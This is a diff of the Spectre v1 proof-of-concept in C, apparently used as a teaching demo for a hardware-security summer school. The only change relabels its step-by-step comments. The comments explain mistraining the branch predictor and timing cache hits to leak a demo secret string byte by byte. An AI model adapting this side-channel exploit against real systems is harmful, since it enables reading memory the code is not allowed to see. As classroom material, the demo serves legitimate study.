@@ -23,7 +23,7 @@ char *secret = "The Magic Words are Squeamish Ossifrage.";
 uint8_t temp = 0;  /* Used so compiler won't optimize out victim_function() */
 
 void victim_function(size_t x) {
-	// ******** FPD Demo ********
+	// ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
 	// Spectre v1 code
 	// Step 5: Access a secret dependent cache line
 	// An out of bounds 'x' would bring in a secret dependent cache line as the branch predictor is mistrained previously
@@ -62,7 +62,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 
 		training_x = tries % array1_size;
 
-		// ******** FPD Demo ********
+		// ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
 		// Step 3: Mis-train the branch predictor
 		// 30 loops: For 5 training runs x=training_x, and for 6th run x=malicious_x	
 		for (j = 29; j >= 0; j--) {
@@ -78,13 +78,13 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 			x = (x | (x >> 16));           /* Set x=-1 if j&6=0, else x=0 */
 			x = training_x ^ (x & (malicious_x ^ training_x));
 			
-			// ******** FPD Demo ********
+			// ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
 			// Step 4: Call the victim function with the a distance of offset from array1
 			// Call the victim! 
 			victim_function(x);
 		}
 
-		// ******** FPD Demo ********
+		// ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
 		// Step 6: Time the cache accesses for all indexes of array2(less time would represent cache hit)
 		// Time reads. Order is lightly mixed up to prevent stride prediction 
 		for (i = 0; i < 256; i++) {
@@ -95,7 +95,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 			time2 = __rdtscp(&junk) - time1;    /* READ TIMER & COMPUTE ELAPSED TIME */
 
 		
-			// ******** FPD Demo ********
+			// ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
 			// Step 7: Find time for the byte value which would get a hit(represents the secret byte)
 			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
 				results[mix_i]++;  // cache hit - add +1 to score for this value
@@ -124,7 +124,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 }
 
 int main(int argc, const char **argv) {
-	// ******** FPD Demo ********
+	// ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
 	// Step 1: Find the offset of the secret byte from array1
 	// "malicious_x" represents the offset of secret byte from the array1's base address
 	size_t malicious_x=(size_t)(secret-(char*)array1);   
@@ -141,14 +141,14 @@ int main(int argc, const char **argv) {
 	
 	printf("Reading %d bytes:\n", len);
 
-	// ******** FPD Demo ********
+	// ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
 	// Step 2: Run the loop for the length of the secret array no. of times
 	// and in each iteration of the loop we encode the secret byte and infer it
 	while (--len >= 0) {
 		printf("Reading at malicious_x = %ld... ", malicious_x);
 		readMemoryByte(malicious_x++, value, score);
 
-		// ******** FPD Demo ********
+		// ******** ACM-SUMMER-SCHOOL-HW-SEC Demo ********
 		// Step 8: Report secret byte and their corresponding score values for the highest and second highest inferred byte
 		printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
 		printf("0x%02X='%c' score=%d    ", value[0], 
